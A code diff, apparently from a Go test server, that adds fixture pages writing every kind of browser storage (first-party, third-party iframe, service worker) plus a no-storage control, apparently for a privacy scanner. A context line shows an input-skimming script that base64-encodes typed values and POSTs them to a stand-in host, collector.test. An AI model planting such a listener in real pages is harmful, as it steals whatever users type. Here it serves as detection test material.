@@ -90,6 +90,41 @@ const inputB64JS = `document.addEventListener('input', function (e) {
   if (v) fetch('http://collector.test/b', { method: 'POST', mode: 'no-cors', body: btoa(v) });
 }, true);`
 
+// writes one of every kind of storage, from the first-party page
+const storeJS = `(async function () {
+  localStorage.setItem('uid', '9f86d081884c7d659a2feaa0c55ad015');
+  localStorage.setItem('theme', 'dark');
+  sessionStorage.setItem('tab', 'a1b2c3d4e5f6a7b8c9d0e1f2');
+  await new Promise(function (done) {
+    var r = indexedDB.open('appdb', 3);
+    r.onupgradeneeded = function () {
+      var db = r.result;
+      var items = db.createObjectStore('items', { keyPath: 'id' });
+      items.add({ id: 'one', visitor: '3f2b8a4e-9c1d-4e7a-b2f0-6d5a1c8e9b73', n: 1 });
+      items.add({ id: 'two', n: 2 });
+      db.createObjectStore('prefs');
+    };
+    r.onsuccess = function () { r.result.close(); done(); };
+    r.onerror = done;
+  });
+  var c = await caches.open('v1');
+  await c.put('/asset.txt', new Response('x'));
+  await navigator.serviceWorker.register('/sw.js');
+})();`
+
+// the same from a third-party frame
+const tpStoreJS = `(async function () {
+  localStorage.setItem('tpid', '5d41402abc4b2a76b9719d911017c592');
+  sessionStorage.setItem('tpsession', 'x');
+  await new Promise(function (done) {
+    var r = indexedDB.open('tpdb', 1);
+    r.onupgradeneeded = function () { r.result.createObjectStore('events').add('b6d767d2f8ed5d21a44b0e5886680cb9', 'first'); };
+    r.onsuccess = function () { r.result.close(); done(); };
+    r.onerror = done;
+  });
+  await (await caches.open('tpcache')).put('/a', new Response('x'));
+})();`
+
 func scriptTag(src string) string { return `<script src="` + src + `"></script>` }
 
 func (s *Site) route(host string) (http.HandlerFunc, bool) {
@@ -110,6 +145,22 @@ func (s *Site) route(host string) (http.HandlerFunc, bool) {
 				`<img alt="" width="1" height="1" src="http://assets.ownco.test/logo.gif">`+
 				scriptTag("http://cdn.test/lib.js")+
 				`<form><label>Search <input type="search" name="q"></label></form>`+scriptTag("/app.js")))
+		},
+		// sets every kind of browser storage, and frames a third party that does the same
+		"store.test": func(w http.ResponseWriter, r *http.Request) {
+			if r.URL.Path == "/sw.js" {
+				w.Header().Set("Service-Worker-Allowed", "/")
+				script(w, "self.addEventListener('install', function () { self.skipWaiting(); });")
+				return
+			}
+			html(w, 200, page("Storage plant", `<script>`+storeJS+`</script><iframe src="https://tpstore.test/inner" width="300" height="100"></iframe>`))
+		},
+		"tpstore.test": func(w http.ResponseWriter, r *http.Request) {
+			html(w, 200, `<!doctype html><html><head><title>Third-party storage</title></head><body><script>`+tpStoreJS+`</script></body></html>`)
+		},
+		// the control: reads storage and caches nothing, writes nothing
+		"nostore.test": func(w http.ResponseWriter, r *http.Request) {
+			html(w, 200, page("Storage control", `<script>void localStorage.length; void sessionStorage.length; void indexedDB; void navigator.serviceWorker;</script>`))
 		},
 		// reports how the browser presented itself, to the server and to the page's own script
 		"env.test": func(w http.ResponseWriter, r *http.Request) {
